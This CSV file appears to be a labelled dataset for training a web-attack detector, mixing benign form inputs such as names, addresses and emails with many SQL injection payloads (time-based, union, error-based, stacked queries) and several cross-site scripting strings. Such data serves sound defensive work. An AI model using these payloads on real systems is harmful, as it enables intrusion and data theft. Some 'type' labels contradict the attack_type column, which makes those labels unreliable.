Text,attack_type,Label,type
"1"");select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
mio de san esteban,norm,0,normal
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('gxpr'='gxpr",sqli,1,normal
"1' in boolean mode) union all select null,null,null,null,null,null,null#",sqli,1,sql
"1') where 3255=3255 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
cirio,norm,0,normal
"1'+(select lhtn where 8484=8484 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",sqli,1,sql
0288508062311799,norm,0,normal
paz,norm,0,normal
arres,norm,0,normal
arles,norm,0,normal
koster.gracindo@webhut.sy,norm,0,normal
4870628613160341,norm,0,normal
7704,norm,0,normal
tempest@quadernideilgarda.gg,norm,0,normal
aragon 24 12?a,norm,0,normal
mamujar,norm,0,normal
"1%')) union all select null,null,null,null#",sqli,1,sql
58698300t,norm,0,normal
pacheco_cox4@frenchpolynesia.com.ru,norm,0,normal
samalot,norm,0,normal
drier@hotelesymas.cl,norm,0,normal
1'||(select 'uiyj' from dual where 8320=8320;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
1%')) union all select null--,sqli,1,sql
1%')));select sleep(5) and ((('%'=',sqli,1,sql
1' waitfor delay '0:0:5'--,sqli,1,sql
ince2@flexinspect.cat,norm,0,normal
indalecio,norm,0,normal
1') and 2006=2006,sqli,1,normal
clamoso,norm,0,normal
"c/ corua, 25, 3h",norm,0,normal
62145911a,norm,0,normal
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'hmqq'='hmqq",sqli,1,normal
09312,norm,0,normal
"1'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('istb'='istb",sqli,1,sql
1')) as qswu where 6377=6377;select case when 5433=6458 then 1 else null end--,sqli,1,sql
"1' or 8466=benchmark(5000000,md5(0x694a4745)) and 'ntaw'='ntaw",sqli,1,normal
"calle poeta guillen colom, 34, 4?d",norm,0,normal
"1%"" order by 1--",sqli,1,sql
aubine,norm,0,normal
chui_alberti@faders.com.nc,norm,0,normal
0604900519989178,norm,0,normal
"1""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""dnlz""=""dnlz",sqli,1,normal
"-9613""))) or elt(3125=7084,7084) and (((""pupl""=""pupl",sqli,1,normal
08619,norm,0,normal
50650,norm,0,normal
37156228g,norm,0,normal
joudrey,norm,0,normal
"1'||(select 'ukfj' where 7133=7133 union all select null,null,null#",sqli,1,sql
"moneyba, 114",norm,0,normal
kaitlyn,norm,0,normal
"1'+(select 'vjoj' where 5348=5348;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
82,norm,0,normal
quilligan.posselt@thw-adm.gy,norm,0,normal
"1"")) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""pmmr""=""pmmr",sqli,1,sql
"c/ duran 52,",norm,0,normal
birgel_pusith@hojainformativas.com.nu,norm,0,normal
claudio iturrieta,norm,0,normal
tuajeva@aeag.ir,norm,0,normal
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,normal
"-3873%')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"1'+(select 'vkis' where 3712=3712 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))+'",sqli,1,sql
48426953q,norm,0,normal
hoggan2,norm,0,normal
"1"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1,sql
"1' where 4388=4388;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
port,norm,0,normal
1) as uhmm where 2304=2304 union all select null#,sqli,1,sql
nettleton.hamissi@estudiodeyoga.pt,norm,0,normal
"1' union all select null,null,null#",sqli,1,sql
07342606v,norm,0,normal
"glorieta mineros, 3,",norm,0,normal
schulz,norm,0,normal
mazanji,norm,0,normal
81587737k,norm,0,normal
1') as ftyp where 5851=5851 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
xaubet sorolla,norm,0,normal
moiss,norm,0,normal
"c/ mirra 25,",norm,0,normal
"1%')));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
fincias alcoriza,norm,0,normal
chilln,norm,0,normal
deering@asociaciondearquitectoslatinoamericanos.sv,norm,0,normal
wessels,norm,0,normal
7754747447747860,norm,0,normal
"-5700 where 4238=4238 union all select 4238,4238,4238#",sqli,1,sql
campuzano bedoya,norm,0,normal
kumushalieva@hiperbarcelona.ly,norm,0,normal
whiteside.seyfferrtitz@cohel.uk,norm,0,normal
denis-focas@007tv.gf,norm,0,normal
"1"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""dsae""=""dsae",sqli,1,sql
"1%"")) rlike (select * from (select(sleep(5)))sgvo) and ((""%""=""",sqli,1,sql
"passatge leon, 93 8?a",norm,0,normal
"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",sqli,1,sql
bakkum,norm,0,normal
"1""))) or 8421=(select count(*) from generate_series(1,5000000)) and (((""lynw"" like ""lynw",sqli,1,sql
"-6084"")) union all select 7354,7354,7354,7354,7354,7354,7354,7354#",sqli,1,sql
empachadamente,norm,0,normal
34419,norm,0,normal
34112,norm,0,normal
kri!sti,norm,0,normal
"1"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""=""jkfk",sqli,1,sql
1%';select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
challee@zonamodelos.co,norm,0,normal
di7a?g7r,norm,0,normal
eckstine@blueeyes.eu,norm,0,normal
80937614q,norm,0,normal
3335,norm,0,normal
andrs castanyer,norm,0,normal
c/ txapin ene 162,norm,0,normal
"cuesta de la baronesa, 192",norm,0,normal
1'+(select 'iify' where 6257=6257 or 6793=(select 6793 from pg_sleep(5)))+',sqli,1,sql
poemtico,norm,0,normal
mettrey,norm,0,normal
"1%') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'='",sqli,1,sql
"-5959"" or 2477=1144",sqli,1,normal
"1"")) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
len,norm,0,normal
"1 union all select null,null,null--",sqli,1,sql
"torre, la",norm,0,normal
gor,norm,0,normal
"pasaje trigueros, 170,",norm,0,normal
lynnell,norm,0,normal
dierkop@hayunmundoahifuera.id,norm,0,normal
9998088000737716,norm,0,normal
ros rius,norm,0,normal
"-3749"" or elt(1032=1032,3623) and ""mzrw""=""mzrw",sqli,1,normal
"1' and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
halbert,norm,0,normal
"plza. carmelo solis, 78, 4?g",norm,0,normal
cegajoso,norm,0,normal
c/ almenas 98 5?f,norm,0,normal
"1%"")) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1'||(select 'wvio' from dual where 8934=8934 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1 where 8074=8074 and elt(3114=3114,sleep(5))#",sqli,1,normal
"-1139) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"1"" or 8421=(select count(*) from generate_series(1,5000000)) and ""cdai""=""cdai",sqli,1,sql
maila,norm,0,normal
elnore,norm,0,normal
1'||(select 'gbyh' from dual where 5889=5889 order by 1#,sqli,1,sql
94lp90ulo,norm,0,normal
"1'||(select 'czos' from dual where 6814=6814;select * from generate_series(6414,6414,case when (6414=6455) then 1 else 0 end) limit 1--",sqli,1,sql
daochuan,norm,0,normal
"c/ el cedro s/n, 2-c",norm,0,normal
3644619165176311,norm,0,normal
dowser,norm,0,normal
hotson,norm,0,normal
guell lloret,norm,0,normal
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1,sql
"1%'))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1') and 3824=benchmark(5000000,md5(0x76555642)) and ('mhvy' like 'mhvy",sqli,1,normal
joux@viajessolomujeres.nf,norm,0,normal
84314573t,norm,0,normal
"1%' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='",sqli,1,normal
1'+(select 'qbdh' where 4006=4006 and 7533=7533)+',sqli,1,sql
papandujo,norm,0,normal
"-2630')) as xavw where 6291=6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",sqli,1,sql
medey,norm,0,normal
portal,norm,0,normal
"1%"")) and 6283=2068 and ((""%""=""",sqli,1,normal
"c/ fray diego de cadiz, 50",norm,0,normal
1) as qkkm where 8461=8461;select (case when (9030=9185) then 9030 else 9030*(select 9030 from information_schema.character_sets) end)#,sqli,1,sql
select 'qqpjq'||(select (case when (2933=2933) then 1 else 0 end))||'qzvzq',sqli,1,sql
"-6550') where 1675=1675 union all select 1675,1675,1675,1675,1675,1675,1675--",sqli,1,sql
callosar,norm,0,normal
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('xjvr'='xjvr",sqli,1,sql
-4023 or (8779=5716)*5716,sqli,1,normal
09193,norm,0,normal
clavero lloveras,norm,0,normal
rivalee,norm,0,normal
"1'+(select papc where 8900=8900 and elt(3114=3114,sleep(5))#",sqli,1,sql
"-8327 where 7555=7555 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"eduardo alvarez, 28",norm,0,normal
puri@espaciodelpintor.er,norm,0,normal
comparendo,norm,0,normal
23599996h,norm,0,normal
17726743e,norm,0,normal
"1'+(select 'feof' where 1966=1966;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))+'",sqli,1,sql
petunia,norm,0,normal
1%')) or 6793=(select 6793 from pg_sleep(5)) and (('%'=',sqli,1,sql
"1"" where 9669=9669;select sleep(5)--",sqli,1,sql
fredesvinda,norm,0,normal
brenna,norm,0,normal
05115765j,norm,0,normal
"-2382%') union all select 8885,8885,8885,8885,8885,8885,8885#",sqli,1,sql
vencilln,norm,0,normal
1) as oknr where 3228=3228;(select * from (select(sleep(5)))srmq)--,sqli,1,sql
bho,norm,0,normal
"<img id=xss src=""&14;javascript:alert('xss');"">",xss,2,xss
03560,norm,0,normal
dosrius,norm,0,normal
1' where 1844=1844;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
kuravlev@minimizar.ve,norm,0,normal
<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('xss')></object>,xss,2,xss
septingentsima,norm,0,normal
"-9487)) as rvck where 9404=9404 or make_set(8921=6045,6045)--",sqli,1,sql
450,norm,0,normal
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",sqli,1,sql
"calle aguamarina, 193 10-d",norm,0,normal
8330458587602542,norm,0,normal
princep muntadas,norm,0,normal
71,norm,0,normal
1'+(select dklj where 3265=3265;select sleep(5)#,sqli,1,sql
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('bmhw' like 'bmhw,sqli,1,sql
"-8021')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('cenk' like 'cenk",sqli,1,sql
"1)) as rhwg where 8843=8843;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
"1%"");select count(*) from generate_series(1,5000000) and (""%""=""",sqli,1,sql
castelan iznaga,norm,0,normal
"1%') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='",sqli,1,sql
arness@pastahut.ga,norm,0,normal
-2120') or 8734=8844#,sqli,1,normal
recordati87,norm,0,normal
"1) as ihan where 5298=5298 and elt(6587=3479,3479)--",sqli,1,sql
<script>alert(document.cookie)</script>@gmail.com,xss,2,xss
1 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# yoch,sqli,1,sql
"-8933) as iiyr where 1974=1974 union all select 1974,1974,1974,1974,1974#",sqli,1,sql
1');(select * from (select(sleep(5)))srmq) and ('pgth'='pgth,sqli,1,sql
34468,norm,0,normal
mirabel,norm,0,normal
.corporativo,norm,0,normal
4073783110590723,norm,0,normal
81012741w,norm,0,normal
batallanos halpin,norm,0,normal
"1""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""suxh""=""suxh",sqli,1,sql
peredo huecas,norm,0,normal
"1'||(select 'drna' from dual where 5082=5082 and 3824=benchmark(5000000,md5(0x76555642)))||'",sqli,1,sql
21387,norm,0,normal
"-5798"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
epalza,norm,0,normal
1) where 2199=2199 or (select * from (select(sleep(5)))ydpu)--,sqli,1,sql
"1');select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
68822552c,norm,0,normal
5urgui8a,norm,0,normal
byron@vinavilano.gl,norm,0,normal
"-1807')) union all select 9853,9853,9853,9853,9853,9853#",sqli,1,sql
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('ajkb'='ajkb",sqli,1,sql
5854,norm,0,normal
5711670970472426,norm,0,normal
volkmann_parfrey1@sigloventidos.be,norm,0,normal
&<script>document.cookie=true;</script>,xss,2,xss
1o92r,norm,0,normal
6085,norm,0,normal
"1%')));iif(4638=8258,1,1/0)",sqli,1,sql
36677303p,norm,0,normal
"1"") and 7533=7533 and (""jfsw"" like ""jfsw",sqli,1,normal
"1')) as cwss where 9720=9720;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1228688038789321,norm,0,normal
crisp vivo,norm,0,normal
"1'+(select rwse where 9843=9843 union all select null,null,null,null,null,null,null--",sqli,1,sql
9771406974624162,norm,0,normal
astar@guiapolicial.lt,norm,0,normal
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('zdkn'='zdkn",sqli,1,sql
sheila,norm,0,normal
cruz iparraguirre,norm,0,normal
zachrisson satalia,norm,0,normal
59,norm,0,normal
"<a href=""javascript#alert('xss');"">",xss,2,sql
"-9740"")) as pxkx where 5305=5305 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"1"") where 8390=8390;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
1');(select * from (select(sleep(5)))acdk)#,sqli,1,sql
haroun,norm,0,normal
59137152n,norm,0,normal
ja.har,norm,0,normal
11380,norm,0,normal
legadura,norm,0,normal
46344401e,norm,0,normal
"1"" and 6969=(select 6969 from pg_sleep(5)) and ""ojpe"" like ""ojpe",sqli,1,sql
vajil-la,norm,0,normal
(select (case when (6986=6986) then 6986 else 6986*(select 6986 from mysql.db) end)),sqli,1,sql
"1')));select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"1"")) union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
"1')) as ypgz where 8704=8704;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
"1' where 1673=1673 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"1%"" and sleep(5)#",sqli,1,normal
genest@artesania.org.am,norm,0,normal
agramontesa,norm,0,normal
1702414193720942,norm,0,normal
-4322')) as magw where 1627=1627 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
"1%')) or elt(5873=5873,sleep(5))#",sqli,1,normal
"calle principal 11, 3a",norm,0,normal
niklas,norm,0,normal
"1)) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((5776=5776",sqli,1,sql
1') and 7533=7533 and ('cryr'='cryr,sqli,1,normal
roca,norm,0,normal
mont olascoaga,norm,0,normal
34196882e,norm,0,normal
piejo,norm,0,normal
"-2263') where 7931=7931 union all select 7931,7931,7931--",sqli,1,sql
"1"")) as hfma where 2654=2654 and make_set(8403=8403,8899)--",sqli,1,sql
gatada,norm,0,normal
"-3082"") where 1082=1082 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
zahnley,norm,0,normal
1') or sleep(5) and ('kgbm'='kgbm,sqli,1,normal
thimeos siurana,norm,0,normal
hache6,norm,0,normal
"-7860'))) union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",sqli,1,sql
"1%"") and elt(4249=4249,7259) and (""%""=""",sqli,1,normal
"1"") or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (""mhfc""=""mhfc",sqli,1,sql
"1'+(select sshu where 3442=3442 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",sqli,1,sql
1' in boolean mode);select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
"-1598))) union all select 9418,9418,9418,9418,9418,9418,9418#",sqli,1,sql
santa mara la real de nieva,norm,0,normal
zicheng,norm,0,normal
"1) union all select null,null,null,null,null,null,null#",sqli,1,sql
"-3902'))) union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",sqli,1,sql
radley,norm,0,normal
6619530004165015,norm,0,normal
amelia,norm,0,normal
algabea,norm,0,normal
"1 where 5382=5382 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
1)));select pg_sleep(5) and (((9476=9476,sqli,1,sql
azpilicueta eckhardt,norm,0,normal
"1""))) union all select null,null,null,null,null,null,null,null#",sqli,1,sql
chungjen,norm,0,normal
"1' or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'scye' like 'scye",sqli,1,sql
"1"") and 6565=2647 and (""mrge"" like ""mrge",sqli,1,normal
celeste_bryon@skullride.ki,norm,0,normal
"1,(case when 6620=3092 then 1 else null end)",sqli,1,normal
"1') where 6941=6941 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
pintado,norm,0,normal
"calle poligon industrial ""el segre"", 118",norm,0,normal
50239662a,norm,0,normal
vai@sexplorador.mk,norm,0,normal
andino sandate,norm,0,normal
paton,norm,0,normal
"1"")));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((""mofa"" like ""mofa",sqli,1,sql
1')));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
60511130q,norm,0,normal
sorbello8@carrillo-de-albornoz.jobs,norm,0,normal
dasya4,norm,0,normal
"1')) union all select null,null,null,null,null#",sqli,1,sql
rohit,norm,0,normal
hardin5,norm,0,normal
fresno de torote,norm,0,normal
equiparable,norm,0,normal
elysha,norm,0,normal
dresdel.holmer@xavipetit.um,norm,0,normal
""";alert(1)//",xss,2,sql
"1%"") union all select null,null,null,null,null#",sqli,1,sql
"calle rio ciguela, 141,",norm,0,normal
"1%"")));select (case when (5290=1720) then 5290 else 1/(select 0) end)--",sqli,1,sql
huerfanidad,norm,0,normal
"1%"";select pg_sleep(5)--",sqli,1,sql
roson-hawke@horiginales.bh,norm,0,normal
"1'+(select unzl where 3432=3432 union all select null,null,null,null--",sqli,1,sql
co1coja,norm,0,normal
bazarjan,norm,0,normal
"1 where 8390=8390 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
nuttall,norm,0,normal
handy.leleu@chevrolet-volt.gob,norm,0,normal
"1"" where 1386=1386;select (case when (3435=4011) then 1 else 3435*(select 3435 from master..sysdatabases) end)--",sqli,1,sql
"calle rendona 45, 5-a",norm,0,normal
9ar631i708ia,norm,0,normal
coria,norm,0,normal
6256718045061012,norm,0,normal
06656,norm,0,normal
"1"") where 1107=1107 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
.h0rner3r1,norm,0,normal
"1,(select (case when (2106=2106) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 2106*(select 2106 from master..sysdatabases) end))",sqli,1,sql
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"<script>alert(""crosssitescripting2"")</script>",xss,2,xss
"calle cosidores, s/n,",norm,0,normal
asturias,norm,0,normal
santa mara de la vega,norm,0,normal
1) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),sqli,1,sql
1');select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
1'||(select 'qtep' where 2572=2572 or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
7987,norm,0,normal
"1')) union all select null,null,null#",sqli,1,sql
"1""));select benchmark(5000000,md5(0x4c4d6142)) and ((""uhvy""=""uhvy",sqli,1,sql
4750834665833814,norm,0,normal
"1""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""lmjg"" like ""lmjg",sqli,1,normal
brion6,norm,0,normal
"1') or 8466=benchmark(5000000,md5(0x694a4745)) and ('ffzv'='ffzv",sqli,1,normal
42552726n,norm,0,normal
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('sstt'='sstt",sqli,1,sql
17240,norm,0,normal
"-5362) union all select 7297,7297,7297,7297,7297#",sqli,1,sql
43877,norm,0,normal
"1"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""fbqy"" like ""fbqy",sqli,1,sql
"1'+(select jrmz where 4762=4762 and elt(9588=9794,9794))+'",sqli,1,sql
carrillo-whitson@mobilecrm.fj,norm,0,normal
"1') where 1027=1027 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
"-2964"")) order by 1--",sqli,1,sql
"1' and elt(3247=3969,3969) and 'xcbm' like 'xcbm",sqli,1,normal
5pio,norm,0,normal
0720546534771199,norm,0,normal
de21,norm,0,normal
1' and 7533=7533 and 'clqy' like 'clqy,sqli,1,normal
51975226x,norm,0,normal
-7404' where 1536=1536 order by 1#,sqli,1,normal
"1%"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""%""=""",sqli,1,sql
"1"" where 9756=9756;if(7899=7899) select 7899 else drop function zbbp--",sqli,1,sql
-2817) where 1212=1212 or 3266=1102,sqli,1,normal
"1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('afdy' like 'afdy",sqli,1,sql
"1%""));if(4907=9581) select 4907 else drop function apqw--",sqli,1,sql
"1%""))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
victoria de los angeles,norm,0,normal
"1')) union all select null,null,null,null,null,null,null#",sqli,1,sql
7094785480687274,norm,0,normal
18129,norm,0,normal
quintanas de gormaz,norm,0,normal
sant andreu de la barca,norm,0,normal
reocn,norm,0,normal
fisgar,norm,0,normal
roperuelos del pramo,norm,0,normal
1' and 5967=4184#,sqli,1,normal
m6tr0cu029o8,norm,0,normal
bocana$da,norm,0,normal
jusmeter-se,norm,0,normal
4814,norm,0,normal
2774742421964079,norm,0,normal
sant juli de ramis,norm,0,normal
12449,norm,0,normal
tom159,norm,0,normal
"1%' or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
50332,norm,0,normal
lagata,norm,0,normal
"1))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (((6583=6583",sqli,1,normal
"1%') and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
hac228ej7,norm,0,normal
"c/ milano 170, 9-d",norm,0,normal
"1"")) as sqzh where 5672=5672 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
1'||(select 'byxb' where 8351=8351 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))||',sqli,1,sql
paris-loisel@viavilano.cr,norm,0,normal
8088,norm,0,normal
amancio,norm,0,normal
2967806020727366,norm,0,normal
wong@hiperespaa.ly,norm,0,normal
